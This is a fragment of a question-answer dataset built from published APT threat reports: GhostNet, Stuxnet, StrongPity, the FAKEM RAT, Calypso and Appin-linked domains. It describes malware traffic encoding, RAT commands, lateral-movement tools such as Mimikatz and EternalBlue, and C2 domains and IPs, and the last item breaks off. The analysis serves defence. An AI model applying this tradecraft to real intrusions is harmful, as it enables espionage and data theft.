    "instruction": "Context: Medium Headline: Box 1. Tracking GhostNet: Lessons Learned\nTracking Ghostnet: Investigating a Cyber Espionage Network was the product of a ten-month investigation and analysis focused on allegations of Chinese cyber espionage against the Tibetan community. The research entailed field-based investigations in India, Europe and North America working directly with affected Tibetan organizations, including the Private Office of the Dalai Lama, the Tibetan Government-in-Exile, and several Tibetan NGOs in Europe and North America. The fieldwork generated extensive data that allowed us to examine Tibetan information security practices, as well as capture evidence of malware that had penetrated Tibetan computer systems. We also engaged in extensive data analysis and technical investigation of web-based interfaces to command and control servers that were used by attackers to send instructions to, and receive data from compromised computers.\nThe title of the report \u2014 Shadows in the Cloud: An Investigation into Cyber Espionage 2.0 \u2014 is suggestive of several threads that wind their way through the investigation. First, the malware networks we document and analyze are to a large degree organized and operated through the misuse of social networking and cloud computing platforms, including Google, Baidu, Yahoo!, and Twitter, in addition to traditional command and control servers. Second, although we are able to piece together circumstantial evidence that provides the location and possible associations of the attackers, their actual identities and motivations remain illusory. We catch a glimpse\nof a shadow of attribution in the cloud, in other words, but have no positive identification. The 2.0 designation also contains a double entendre: it refers to a generational shift we believe is unfolding in malware networks in multiple dimensions, from what were once primarily simple to increasingly complex, adaptive systems spread across redundant services and platforms, and from criminal and industrial-based exploitation to political, military, and intelligence-focused espionage. The 2.0 reference is also meant to note how the Shadow investigation is both a re-engagement with, but also a departure from, its predecessor: the Tracking GhostNet investigation.\nThis report is a continuation of Tracking GhostNet, but also represents a significantly new investigation yielding different and more nuanced evidence and analysis of the evolving cybercrime and cyber espionage environment. As with GhostNet, we are interested in better understanding the evolving nature and complex ecosystem of today's malware networks and see this investigation as helping to build a knowledge base around cyber security research. In this respect, Shadows in the Cloud is very much a work-in-progress, insofar as we began this investigation by picking up several threads that were left open-ended or unanswered in the original GhostNet investigation, and expect to continue to examine threads that are left hanging in this report.\nThe aim of this present investigation is to further refine the methodologies used to investigate and analyze malware networks through a fusion methodology, which combines network-based technical interrogation, data analysis and visualization, and field-based contextual investigations (See Box 2, below). The combination of methods from different disciplines is a critical and common feature of both the GhostNet and Shadow investigations and analyses. Network-based technical interrogation, open source data mining and analysis (using tools such as Google), key informant interviews and field-based investigations on their own can accomplish a great deal, but it is through their fusion that a more comprehensive and nuanced understanding can be achieved.\nMedium Headline: Box 2. Operationalizing the Fusion Methodology\nOver the past decade we have been developing a fusion methodology for investigating the exercise of political power in cyberspace. This approach combines quantitative, qualitative and technical data, and draws on multidisciplinary analysis techniques to derive results. In our field investigations, we conduct research among affected target audiences and employ techniques that include interviews, long-term in situ interaction with our partners, and technical data collection involving system monitoring, network reconnaissance, and interrogation. Data and in situ analysis from field investigations are then taken to the lab where they are analysed using a variety of data fusion and visualization methods, based around the Palantir data fusion system. Leads developed on the basis of in-field activities are pursued through technical investigations and the resulting data and analysis outputs are shared with our in-field teams and partners for verification and for generating additional entry points for follow-on field investigations. We then interpret results from these investigations through a variety of theoretical lenses drawing from disciplines of political science, international relations, sociology, risk analysis, and criminology (among others). We believe that through this mixed methods interdisciplinary approach we are able to develop a richer understanding than would be possible from studies that focus solely on technical analysis or that primarily consist of legal, policy or theoretical investigations.\nThe Shadow investigation began as a follow-up of unexplored paths discovered during the GhostNet investigation. It started in the offices of Tibetan organizations who suspected they were targets of cyber espionage, and broadened to include a much wider list of victims. The investigation used a number of techniques, including a DNS sinkhole we established by registering domains that had previously been used by the attackers targeting Tibetan institutions, such as a computer system at the offices of the Dalai Lama. This reinforces our view that the combination of technical analysis and field investigation forms a fruitful starting point of inquiry that ultimately leads to important insights into the attackers' capabilities, the ability to investigate a much wider domain of infected targets, and a contextual understanding of the attackers.\nAs was the case with GhostNet, dozens of high-level government networks, embassies, international organizations and others have been penetrated, and confidential, sensitive, and private documents stolen. The Shadows report underscores the interconnected and complex challenges of cyber security. In particular, it points to the possibility of a perfect storm that may result from a lack of international consensus, ill-developed and implemented security practices, a paucity of notification mechanisms, and the growing confluence of cyber crime, traditional espionage, and the militarization of cyberspace.\nAnswer this question: How did the 'Shadows in the Cloud' investigation differ from its predecessor, the 'Tracking GhostNet' investigation, in terms of methodology and scope? Why was this evolution necessary?",
    "output": "The 'Shadows in the Cloud' investigation built upon the 'Tracking GhostNet' investigation but represented a significantly new investigation with more nuanced evidence and analysis. The methodology evolved to include a fusion approach that combined network-based technical interrogation, data analysis and visualization, and field-based contextual investigations. This evolution was necessary to better understand the complex ecosystem of modern malware networks, which have become increasingly sophisticated and adaptive, spreading across multiple services and platforms. The investigation aimed to refine these methodologies to achieve a more comprehensive understanding of cybercrime and cyber espionage.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Iran: a \"hot\" cyber war\nWherever significant activity erupts in the real world (including crime, espionage, and warfare), parallel activity unfolds in cyberspace. It is therefore unsurprising that Iran\u2014which has tense international relations and is on the verge of acquiring a nuclear bomb\u2014has also experienced the most sophisticated cyber attacks to date.\nIn 2010, Stuxnet was a \"cyber missile\" of sorts designed with painstaking precision to burrow deep into Iran's nuclear program and destroy physical infrastructure. To some degree, this piece of software replaced a squadron of fighter aircraft that would have violated foreign airspace, dropped laser-guided bombs, and left a smoking crater in the Earth's surface.52 Beyond Stuxnet, other advanced espionage attacks have worried security experts, including Duqu, Flame, and Gauss, which all may have come from the same threat actor.53 And even amateurs are successfully targeting Iran; although the \"Mahdi\" malware is by comparison far less sophisticated than Stuxnet and its cousins, Mahdi has still managed to compromise engineering firms, government agencies, financial services firms, and academia throughout the Middle East.54\n52 Sanger, D. Confront and Conceal. (New York: 2012) pp. 188-225.\n53 Boldizs\u00e1r Bencs\u00e1th. \"Duqu, Flame, Gauss: Followers of Stuxnet,\" BME CrySyS Lab, RSA 2012.\n54 Simonite, T. (31 Aug 2012) \"Bungling Cyber Spy Stalks Iran,\" MIT Technology Review.\nSo how does anyone, including a nation-state, respond to a cyber attack? Does the counterstrike remain within the cyber realm, or can it come in the form of a traditional military (or terrorist) assault? In 2012, Iran appears to have chosen the first option. A hacker group called the \"Cutting Sword of Justice\" used the \"Shamoon\" virus to attack the Saudi Arabian national oil company Aramco, deleting data on three-quarters of Aramco's corporate PCs (including documents, spreadsheets, e-mails, and files) and replacing them with an image of a burning American flag.55 And over the past year, another group called Izz ad-Din al-Qassam launched \"Operation Ababil,\" a series of DDoS attacks against many U.S. financial institutions including the New York Stock Exchange.56\nOther examples of cyber attacks abound. In 2009, the plans for a new U.S. Marine Corps 1 presidential helicopter were found on a file-sharing network in Iran.57 In 2010, the \"Iranian Cyber Army\" disrupted Twitter and the Chinese search engine Baidu, redirecting users to Iranian political messages.58 In 2011, Iranian attackers compromised a Dutch digital certificate authority, after which it issued more than 500 fraudulent certificates for major companies and government agencies.59 In 2012, Iran disrupted the BBC's Persian Language Service, and University of Toronto researchers reported that some versions of the Simurgh \"proxy\" software (which is popular in countries like Iran and anonymizes Internet traffic) also installed a Trojan that collected usernames and keystrokes, sending them to a likely intelligence collection site.60 Finally, in 2013 the Wall Street Journal reported that Iranian actors had increased their efforts to compromise U.S. critical infrastructure.61\nMedium Headline: Syria: what is the Syrian Electronic Army?\nSyria is in the midst of a civil war, so researchers have a lot of cyber activity to analyze. The most prominent hacker group by far is the Syrian Electronic Army (SEA), which is loyal to Syrian President Bashar al-Assad. SEA has conducted DDoS attacks, phishing, pro-Assad defacements, and spamming campaigns against governments, online services, and media that are perceived to be hostile to the Syrian government. SEA has hacked Al-Jazeera, Anonymous, Associated Press (AP), BBC, Daily Telegraph, Financial Times, Guardian, Human Rights Watch, National Public Radio, The New York Times, Twitter, and more.62 Its most famous exploit was a hoax announcement using AP's Twitter account that the White House was bombed and President Obama injured\u2014after which stock markets briefly dipped to the tune of $200 billion.63\n55 Perlroth, N. (23 Oct 2012) \"In Cyberattack on Saudi Firm, U.S. Sees Iran Firing Back,\" The New York Times.\n56 Walker, D. (8 Mar 2013) \"Hacktivists plan to resume DDoS campaign against U.S. banks,\" SC Magazine.\n57 Borak, D. (3 Mar 2009) \"Source in Iran views Marine One blueprints,\" Marine Corps Times.\n58 Wai-yin Kwok, V. (13 Jan 2010) \"Baidu Hijacked By Cyber Army,\" Forbes.\n59 Charette, R. (9 Sep 2011) \"DigiNotar Certificate Authority Breach Crashes e-Government in the Netherlands,\" IEEE Spectrum.\n61 Gorman, S. & Yadron, D. (23 May 2013) \"Iran Hacks Energy Firms, U.S. Says,\" Wall Street Journal.\n62 Fisher, M. & Keller, J. (31 Aug 2011) \"Syria's Digital Counter-Revolutionaries.\" The Atlantic; \"Syrian Electronic Army,\" (accessed 25 July, 2013) Wikipedia.\n60 \"Iranian anti-censorship software 'Simurgh' circulated with malicious backdoor,\" (25 May 2012) Citizenlab.\n63 Manzoor, S. (25 July, 2013) \"Slaves to the algorithm: Are stock market math geniuses, or quants, a force for good?\" The Sunday Telegraph.\nIn the month of July 2013 alone, SEA compromised three widely used online communications websites: Truecaller (the world's largest telephone directory),64 Tango (a video and text messaging service),65 and Viber (a free online calling and messaging application).66 These types of compromises are significant because they can give Syrian intelligence access to the communications of millions of people, including political activists within Syria who might then be targeted for espionage, intimidation, and arrest.\nTo compromise its targets, the SEA often sends socially engineered, spear-phishing emails to lure opposition activists into opening fraudulent, weaponized, and malicious documents. If the recipient falls for the scam, Trojan horse, remote access tool (RAT) software is installed on the victim's computer that can give the attacker keystrokes, screenshots, microphone and webcam recordings, stolen documents, and passwords. And of course, the SEA likely sends all of this information to a computer address lying within Syrian government-controlled Internet Protocol (IP) space for intelligence collection and review.67\nMedium Headline: Israel: old conflict, new tactics\nEven during the Cold War, the Arab-Israeli conflict saw many hot wars, and it was often the testing ground for new military weapons and tactics. Nothing has changed in the Internet era. Since at least 2000, pro-Israeli hackers have targeted sites of political and military significance in the Middle East.68 In 2007, Israel reportedly disrupted Syrian air defense networks via cyber attack (with some collateral damage to its own domestic networks) to facilitate the Israeli Air Force's destruction of an alleged Syrian nuclear facility.69\n64 Khare, A. (19 July 2013) \"Syrian Electronic Army Hacks Truecaller Database, Gains Access Codes to Social Media Accounts.\" iDigital Times.\n65 Kastrenakes, J. (22 July 2013) \"Syrian Electronic Army alleges stealing 'millions' of phone numbers from chat app Tango.\" The Verge; Albanesius, C. (23 July 2013) \"Tango Messaging App Targeted by Syrian Electronic Army.\" PCMag.\n66 Ashford, W. (24 July 2013) \"Syrian hacktvists hit second mobile app in a week.\" Computer Weekly.\n67 Tsukayama, H. (28 Aug 2013) \"Attacks like the one against the New York Times should put consumers on alert,\" The Washington Post.\n68 Geers K. (2008) \"Cyberspace and the Changing Nature of Warfare,\" Hakin9 E-Book, 19(3) No. 6; SC Magazine (27 AUG 08) 1-12.\n69 Carroll, W. (26 Nov 2007) \"Israel's Cyber Shot at Syria,\" Defense Tech.\nBut as an advanced industrial nation, Israel also depends on information technology. The nation has proven to be vulnerable to cyber attacks, which often target the Israeli economy. In 2009, during Israel's military operation in Gaza, hackers briefly paralyzed many government sites with a DDoS attack from at least 500,000 computers. The 2009 attack consisted of four independent waves, each stronger than the last, peaking at 15 million junk mail deliveries per second. The Israeli \"Home Front Command\" website, which plays a key role in national defense communications with the public, was down for three hours. Due to technical similarities with the 2008 cyber attack on Georgia during its war with Russia, Israeli officials surmised that the attack itself might have been carried out by a criminal organization in the former Soviet Union, and paid for by Hamas or Hezbollah.70\nOften, the trouble with cyber attacks is that they do not need to be highly sophisticated to succeed, even against security-conscious Israel. In 2012, the ineptly written71 \"Mahdi\" malware compromised at least 54 targets in Israel.72 Last but not least, in 2013, the Iranian media reported that the Syrian army had carried out a cyber attack against the water supply of the Israeli city of Haifa. Prof. Isaac Ben-Israel, a cyber security adviser to Prime Minister Benjamin Netanyahu, said that the report was false, but added that cyber attacks on critical infrastructures pose a \"real and present threat\" to Israel.73\n\nHow did the Stuxnet malware differ from traditional military operations, and what was its intended target in Iran?",
    "output": "A: Stuxnet was a highly sophisticated piece of malware designed to specifically target and destroy physical infrastructure within Iran's nuclear program. Unlike traditional military operations that involve physical force and potential collateral damage, Stuxnet acted as a 'cyber missile,' burrowing deep into the nuclear facilities to sabotage them. This approach replaced the need for a squadron of fighter aircraft and laser-guided bombs, making it a precise and covert alternative to conventional military action.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the StrongPity APT manage to target users of encryption tools, specifically WinRAR and TrueCrypt, and what were the primary geographical areas affected?",
    "output": "The StrongPity APT targeted users of encryption tools through watering hole attacks and poisoned installers. For WinRAR, they set up malicious sites such as winrar.it and winrar.be, which redirected users to download malicious files. The primary geographical areas affected by the winrar.it site were Italy, Belgium, Algeria, Cote D'Ivoire, Morocco, France, and Tunisia. Similarly, the winrar.be site primarily affected Belgium, Algeria, Morocco, Netherlands, Canada, Cote D'Ivoire, and Tunisia. For TrueCrypt, the group set up a site mimicking the legitimate TrueCrypt website, redirecting users from tamindir.com to true-crypt.com, with most victims located in Turkey and some in the Netherlands.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Backdoor\nThe network traffic the malware produces is designed to look like Windows Messenger traffic. Malware of this type were discussed on Twitter, noted by SonicWALL, and found to have been active as far back as September 2009.7 However, it remains unclear if all the attacks that used this malware were connected.\nThe malicious traffic begins with headers similar to actual Windows Messenger traffic:\nMSG 5 N 130\nMIME-Version: 1.0\nHowever, beyond this, you will see that the traffic is not valid Windows Messenger traffic but may be sufficiently disguised as such to escape further scrutiny.\n6 UPX is a free tool that compresses executable files. However, it is commonly used to pack malware files, see  for more details.\nFIGURE 2: Malicious traffic disguised as legitimate Windows Messenger traffic\nFIGURE 3: Legitimate Windows Messenger traffic\nCompared with actual Windows Messenger traffic shown in Figure 3, it is easy to distinguish the malicious traffic shown in Figure 2.\nDuring our investigation of the fake \"Windows Messenger\" RAT, we found another version that attempts to disguise its network traffic as Yahoo! Messenger traffic. The network communication this version uses begins with YMSG, the Yahoo! Messenger traffic header.\nFIGURE 4: Malicious traffic disguised as Yahoo! Messenger traffic\nFIGURE 5: Legitimate Yahoo! Messenger traffic\nHowever, the network traffic shown in Figure 4 does not resemble legitimate Yahoo! Messenger traffic beyond the use of the header, YMSG. Compared with the legitimate Yahoo! Messenger traffic shown in Figure 5, it is easy to distinguish between the two.\nA third version of the FAKEM RAT attempts to disguise the network traffic it produces as HTML. The malicious traffic begins with strings like <html><title>1..56</title><body> or <html><title>12356</title><body>. 8\nThis is a fairly rudimentary disguise and odd because you would expect HTML to be the result of a request to a web server and not as something a client would send to a web server.\nFIGURE 6: Malicious traffic disguised as HTML traffic\nBig Headline: Network Traffic Encryption\nThe network communication between the compromised computer and the RAT controller is encrypted. The encryption is the same across variants and done at the bit level. Each byte is XOR-ed by every letter in the string, YHCRA, and rotated 3 bits to the right after every XOR operation. Encrypting the communication ensures that the suspicious data passed between the compromised host and the attackers cannot be easily viewed in plain text. The communication comes in 1024-byte blobs of data that start with the 32-byte header. It appears that attackers may specify any kind of fake headers within the first 32 bytes in order to disguise the subsequent network traffic.\nThe following bits of information are initially sent by the compromised host when the communication starts:\n\u2022 User name\n\u2022 Computer name\n\u2022 OEM code page identifier\n\u2022 What looks like a campaign code but only for some samples\nThe commands are not preconfigured as the malware relies on the data sent by the server. For instance, when a client receives the command, 0211, this signifies that it should execute the accompanying data in memory.\nThe following are the commands the server issues and their meanings:\n\u2022 0211: Execute code.\n\u2022 0212: Reconnect to receive data.\n\u2022 0213: Sleep, close socket, and reconnect.\n\u2022 0214: Exit.\nTo determine the RAT's capabilities, we allowed the attackers to infiltrate a honeypot computer and captured all of the network traffic it generated. We decrypted the network traffic and determined the commands the attackers used, which include:\n\u2022 CmdMana: Command Manager allows attackers to execute shell commands.\n\u2022 FileMan: File Manager allows the attackers to browse directories.\n\u2022 HostIn: Host Information provides information about the compromised computer.\n\u2022 ProcMan: Process Manager gives attackers access to running processes.\n\u2022 RegMana: Registry Manager gives attackers access to the Windows registry.\n\u2022 Scree: Screen takes a snapshot of the desktop.\n\u2022 ServiceMa: Service Manager allows access to services.\n\u2022 Passwo: Password accesses stored passwords like those saved in Internet Explorer (IE).\n\u2022 UStea: Uploads files from a compromised computer.\nThe Windows Messenger samples we analyzed were clustered into five groups that did not have overlapping linkages. Four of the clusters were relatively small and focused on four different domains:\n\u2022 vcvcvcvc.dyndns.org\n\u2022 zjhao.dtdns.net\n\u2022 avira.suroot.com\n\u2022 *.googmail.com\nThe vcvcvcvc.dyndns.org domain is particularly interesting because we also found it being used as a command-and-control (C&C) server for Protux\u2014a well-known malware family that has been used in many targeted attacks over the years. We also found that the avira.suroot.com domain used as a C&C server for yet another malware family we call \"cxgid.\"\nThe *.googmail.com domain was slightly larger and included names like apple12.crabdance.com and apple12.co.cc. However, the largest cluster revolved around the *.yourturbe.org domain and overlapped with the HTML variant. We also found small clusters of the HTML variant that revolved around the domain, endless.zapto.org, which was downloaded as a second-stage malware by Protux.\nFIGURE 7: FAKEM domains associated with the Windows Messenger and HTML variants\nFIGURE 8: FAKEM domains associated with the Yahoo! Messenger variant\nMeanwhile, the Yahoo! Messenger samples we analyzed all accessed freeavg. sytes.net\u2014a domain name that frequently resolved to different IP addresses.\nThe various samples we collected appear to belong to groups that overlapped a little. This suggests that rather than being associated with a particular campaign, the use of various FAKEM RATs could be distributed among multiple threat actors.\nBig Headline: Conclusion\nKnowledge of the attack tools, techniques, and infrastructure of adversaries is critical for developing defensive strategies. This research paper examined three variants of a RAT\u2014FAKEM\u2014that attempt to disguise the network traffic they produce to stay under the radar.\nNow that popular RATs like Gh0st and PoisonIvy have become well-known and can easily be detected, attackers are looking for methods to blend in with legitimate traffic. While it is possible to distinguish the network traffic FAKEM RAT variants produce for the legitimate protocols they aim to spoof, doing so in the context of a large network may not be not easy. The RAT's ability to mask the traffic it produces may be enough to provide attackers enough cover to survive longer in a compromised environment.\nFortunately, solutions like Trend Micro\u2122 Deep Discovery can help network administrators protect their organizations from attacks that use the FAKEM RAT by detecting the traffic its variants produce.\nMedium Headline: TREND MICRO INCORPORATED\nTrend Micro Incorporated (TYO: 4704; TSE: 4704), a global cloud security leader, creates a world safe for exchanging digital information with its Internet content security and threat management solutions for businesses and consumers. A pioneer in server security with over 20 years' experience, we deliver top-ranked client, server and cloud-based security that fits our customers' and partners' needs, stops new threats faster, and protects data in physical, virtualized and cloud environments. Powered by the industry-leading Trend Micro\u2122 Smart Protection Network\u2122 cloud computing security infrastructure, our products and services stop threats where they emerge\u2014from the Internet. They are supported by 1,000+ threat intelligence experts around the globe.\n\nQuestion: What is the encryption method used by the FAKEM RAT for its network communication, and how does it ensure the data is not easily viewable in plain text?\n\nAnswer:",
    "output": "The FAKEM RAT uses a specific encryption method for its network communication, which involves XOR-ing each byte with every letter in the string 'YHCRA' and then rotating the byte 3 bits to the right after every XOR operation. This encryption is applied at the bit level and ensures that the suspicious data passed between the compromised host and the attackers cannot be easily viewed in plain text. The communication is structured in 1024-byte blobs of data that start with a 32-byte header, which can contain any kind of fake headers to further disguise the network traffic.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Initial infection vector\nThe attackers accessed the internal network of a compromised organization by using an ASPX web shell. They uploaded the web shell by exploiting a vulnerability or, alternately, guessing default credentials for remote access. We managed to obtain live traffic between the attackers and the web shell.\nThe traffic indicates the attackers connected from IP address 46.166.129.241. That host contains domain tv.teldcomtv.com, the C2 server for the group's trojan. Therefore the hackers use C2 servers not only to control malware, but also to access hosts on compromised infrastructures.\nThe attackers used the web shell to upload utilities1 and malware,2 execute commands, and distribute malware inside the network. Examples of commands from the traffic are demonstrated in the following screenshot.\n1. See the section \"Lateral movement.\"\n2. See the section \"Analyzing Calypso RAT malicious code.\"\nBig Headline: Lateral movement\nThe group performed lateral movement by using the following publicly available utilities and exploits:\n\u2022 SysInternals\n\u2022 Nbtscan\n\u2022 Mimikatz\n\u2022 ZXPortMap\n\u2022 TCP Port Scanner\n\u2022 Netcat\n\u2022 QuarksPwDump\n\u2022 WmiExec\n\u2022 EarthWorm\n\u2022 OS_Check_445\n\u2022 DoublePulsar\n\u2022 EternalBlue\n\u2022 EternalRomance\nOn compromised computers, the group stored malware and utilities in either C:\\RECYCLER or C:\\ProgramData. The first option was used only on computers with Windows XP or Windows Server 2003 with NTFS on drive C.\nThe attackers spread within the network either by exploiting vulnerability MS17-010 or by using stolen credentials. In one instance, 13 days after the attackers got inside the network, they used DCSync and Mimikatz to obtain the Kerberos ticket of the domain administrator, \"passing the ticket\" to infect more computers.\nUse of such utilities is common for many APT groups. Most of those utilities are legitimate ones used by network administrators. This allows the attackers to stay undetected longer.\nBig Headline: Attribution\nIn one attack, the group used Calypso RAT, PlugX, and the Byeby trojan. Calypso RAT is malware unique to the group and will be analyzed in detail in the text that follows.\nPlugX has traditionally been used by many APT groups of Asian origin. Use of PlugX in itself does not point to any particular group, but is overall consistent with an Asian origin.\nThe Byeby trojan1 was used in the SongXY malware campaign back in 2017. The version used now is modified from the original. The group involved in the original campaign is also of Asian origin. It performed targeted attacks on defense and government-related targets in Russia and the CIS countries. However, we did not find any clear-cut connection between the two campaigns.\nWhen we analyzed the traffic between the attackers' server and the web shell, we found that the attackers used a non-anonymous proxy server. The X-Forwarded-For header passed the attackers' IP address (36.44.74.47). This address would seem to be genuine (more precisely, the first address in a chain of proxy servers).\n1.\nThe IP address belongs to China Telecom. We believe the attackers could have been careless and set up the proxy server incorrectly, thus disclosing their real IP address. This is the first piece of evidence supporting the Asian origins of the group.\nThe attackers also left behind a number of system artifacts, plus traces in utility configurations and auxiliary scripts. These are also indicative of the group's origin.\nFor instance, one of the DoublePulsar configuration files contained external IP address 103.224.82.47, presumably for testing. But all other configuration files contained internal addresses.\nThis IP address belongs to a Chinese provider, like the one before, and it was most likely left there due to the attackers' carelessness. This constitutes additional evidence of the group's Asian origins.\nWe also found BAT scripts that launched ZXPortMap and EarthWorm for port forwarding. Inside we found network indicators www.sultris.com and 46.105.227.110.\nThe domain in question was used for more than just tunneling: it also served as C2 server for the PlugX malware we found on the compromised system. As already mentioned, PlugX is traditionally used by groups of Asian origin, which constitutes yet more evidence.\nTherefore we can say that the malware and network infrastructure used all point to the group having an Asian origin.\nBig Headline: Dropper\nThe dropper extracts the payload as an installation BAT script and CAB archive, and saves it to disk. The payload inside the dropper has a magic header that the dropper searches for. The following figure shows an example of the payload structure.\nThe dropper encrypts and decrypts data with a self-developed algorithm that uses CRC32 as a pseudorandom number generator (PRNG). The algorithm performs arithmetic (addition and subtraction) between the generated data and the data that needs to be encrypted or decrypted.\nNow decrypted, the payload is saved to disk at %ALLUSERSPROFILE;\\TMP_%d%d, where the last two numbers are replaced by random numbers returned by the rand() function. Depending on the configuration, the CAB archive contains one of three possibilities: a DLL and encrypted shellcode, a DLL with encoded loader in the resources, or an EXE file. We were unable to detect any instances of the last variant.\nBig Headline: Installation BAT script\nThe BAT script is encoded by substitution from a preset dictionary of characters; this dictionary is initialized in a variable in the installation script.\nIn the decoded script, we can see comments hinting at the main functions of the script:\n\u2022 REM Goto temp directory & extract file (go to TEMP directory and extract files there)\n\u2022 REM Uninstall old version (uninstall the old version)\n\u2022 REM Copy file (copy file)\n\u2022 REM Run pre-install script (run the installation BAT script)\n\u2022 REM Create service (create a service launching the malware at system startup)\n\u2022 REM Create Registry Run (create value in the registry branch for autostart)\nAt the beginning of each script we can see a set of variables. The script uses these variables to save files, modify services, and modify registry keys.\nIn one of the oldest samples, compiled in 2016, we found a script containing comments for how to configure each variable.\nBig Headline: Shellcode x86: stager\nIn most of the analyzed samples, the dropper was configured to execute shellcode. The dropper saved the DLL and encrypted shellcode to disk. The shellcode name was always identical to that of the DLL, but had the extension .dll.crt. The shellcode is encrypted with the same algorithm as the payload in the dropper. The shellcode acts as a stager providing the interface for communicating with C2 and for downloading modules. It can communicate with C2 via TCP and SSL. SSL is implemented via the mbed_tls library.\nInitial analysis of the shellcode revealed that, in addition to dynamically searching for API functions, it runs one more operation that repeats the process of PE file address relocation. The structure of the relocation table is also identical to that found in the PE file.\nSince the process of shellcode address relocation repeats that of the PE file, we can assume that initially the malware is compiled into a PE file, and then the builder turns it into shellcode. Debugging information found inside the shellcode supports that assumption.\nAPI functions are searched for dynamically and addresses are relocated, after which the configuration hard-coded inside the shellcode is parsed. The configuration contains information about the C2 server address, protocol used, and connection type.\nNext the shellcode creates a connection to C2. A random packet header is created and sent to C2. In response the malware receives a network key, saves it, and then uses it every time when communicating with C2. Then the information about the infected computer is collected and sent to C2.\nNext three threads are launched. One is a heartbeat sending an empty packet to C2 every 54 seconds. The other processes and executes commands from C2. As for the third thread, we could not figure out its purpose, because the lines implementing its functionality were removed from the code. All we can tell is that this thread was supposed to \"wake up\" every 54 seconds, just like the first one.\nBig Headline: Modules\nWe have not found any modules so far. But we can understand their functionality by analyzing the code responsible for communication between the shellcode and the modules. Each module is shellcode which is given control over the zero offset of the address. Each module exists in its own separate container. The container is a process with loaded module inside. By default, the process is svchost.exe. When a container is created, it is injected with a small shellcode that causes endless sleep. This is also hard-coded in the main shellcode, and more specifically in JustWait. pdb, most likely.\nThe module is placed inside with an ordinary writeprocess and is launched either with NtCreateThreadEx or, on pre-Vista operating systems, CreateRemoteThread.\nTwo pipes are created for each module. One is for transmitting the data from the module to C2; the other for receiving data from C2. Quite likely the modules do not have their own network code and instead use the pipes to communicate with external C2 through the main shellcode.\nEach module has a unique ID assigned by C2. Containers are launched in different ways. A container can be launched in a specific session open in the OS or in the same session as the stager. In any particular session, the container is launched by getting the handle for the session token of a logged-in user, and then launching the process as that user.\nQuestion: What tools and techniques did the Calypso APT group employ for lateral movement within the compromised network? How did they attempt to remain undetected?",
    "output": "Answer: The Calypso APT group employed several publicly available utilities and exploits for lateral movement, including SysInternals, Nbtscan, Mimikatz, ZXPortMap, TCP Port Scanner, Netcat, QuarksPwDump, WmiExec, EarthWorm, OS_Check_445, DoublePulsar, EternalBlue, and EternalRomance. They spread within the network by exploiting vulnerability MS17-010 or using stolen credentials. In one instance, they used DCSync and Mimikatz to obtain the Kerberos ticket of the domain administrator to infect more computers. The use of legitimate network administration tools allowed the attackers to stay undetected longer.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The word \"Appin\".\nIn a great number of isolated cases and contexts, the word \"Appin\" shows up and there seems to be some connection with the Indian security company called Appin Security Group. By this, we are not implicating or suggesting inappropriate activity by Appin. Maybe someone has tried to hurt Appin by falsifying evidence to implicate them. Maybe some rogue agent within Appin Security Group is involved, or maybe there are other explanations. Getting to the bottom of that is beyond our visibility.\nFor example, the strings \"Appin\", \"AppinSecurityGroup\", and \"Matrix\" are frequently found inside executables.\nOne example of this peculiarity is debug paths inside malware files:\nC:\\BNaga\\backup_28_09_2010\\threads tut\\pen-backup\\BB_FUD_23\\Copy of client\\ Copy of client\\appinbot_1.2_120308\\Build\\Win32\\Release\\appinclient.pdb\nC:\\BNaga\\kaam\\Appin SOFWARES\\RON 2.0.0\\Release\\Ron.pdb\nC:\\BNaga\\SCode\\BOT\\MATRIX_1.2.2.0\\appinbot_1.2_120308\\Build\\Win32\\Release\\deleter.pdb\nC:\\Documents and Settings\\Administrator\\Desktop\\Backup\\17_8_2011\\MATRIX_1.3.4\\CLIENT\\ Build\\Win32\\Release\\appinclient.pdb\nD:\\Projects\\Elance\\AppInSecurityGroup\\FtpBackup\\Release\\Backup.pdb\nOne should note that anyone can add or change such text strings.\nBig Headline: Domain registrations\nAs mentioned, the privacy-protection of domain registrations is almost perfect, but only almost. There are a large number of domains used, and a few of these have been suspended and lost their privacy protection. For example, the following malicious domains all used the same registration information\nNITR0RAC3.COM, VALL3Y.COM, S3RV1C3S.NET, GAUZPIE.COM, BLUECREAMS.COM:\nRegistrant:\nNA Prakash\n(mail@gmail.com) Jain\nTY-76, Kohat Enclave\nDelhi\nDelhi,110034 IN\nTel. +011.9873456756\nIdentical registration information is also used for other domains that seem unrelated to the attack infrastructure, like hackerscouncil.com which May 12th 2011 had the following entry (source: gwebtools.com).\nApril 3th 2011, a little over a month before the registration entry above, hackerscouncil.com was registered by Appin Technologies (5). This is possibly a coincidence.\nMedium Headline: PIEGAUZ.NET\nRegistrant:\nPrivacyProtect.org\nDomain Admin  (contact@privacyprotect.org)\nP.O. Box 97\nNote - All Postal Mails Rejected, visit Privacyprotect.org\nMoergestel null,5066 ZH NL\nTel. +45.36946676\nOne trojan using this domain (md5 4a44b6b6463fa1a8e0515669b10bd338) was submitted to the ThreatExpert analysis service October 28th 2010, at which time the domain was operational and accepted uploads from the malware (6). Three days later, October 31st 2010, the domain got suspended, which removed its privacy protection:\nMedium Headline: PIEGAUZ.NET\nRegistrant:\nAppin Technologies\nRakesh Gupta  (rakesh.gupta@appinonline.com)\n9th Floor, Metro Heights,NSP, PitamPura,\nDelhi\nDelhi,110034\nIN\nTel. +91.1147063300\nCreation Date: 21-Apr-2010\nExpiration Date: 21-Apr-2011\nThe domain bluecreams.com was initially registered by Appin Security Solutions Pvt. Ltd. Sept 17th 2009. The day after it was put under privacy protection. In the period from end of June 2010 to February 2011 it was documented as download domain for several trojans (7). It was suspended Apr 18th 2011 and then displayed the already mentioned Prakash Jain as registrant.\nAnother example is the domain zerodayexploits.org. This domain has a history of resolving to a series of malicious IP addresses used for malware attacks (173.236.24.254, 8.22.200.44). This web site which offers bounties for zeroday exploits, claims to be founded by \"Appin Morpheus\" and powered by Appin.\nSource: bgwhois.com\nAlso the live behaviour of some domains shows the word Appin. The malicious domains alr3ady.net, wearwellgarments.eu, ezservicecenter.org, secuina.net, go-jobs.net, shoperstock.com and maxtourguide.info inhabit the IP space 178.32.75.192 - 178.32.75.197. All these IP's return a recognizable ESMTP 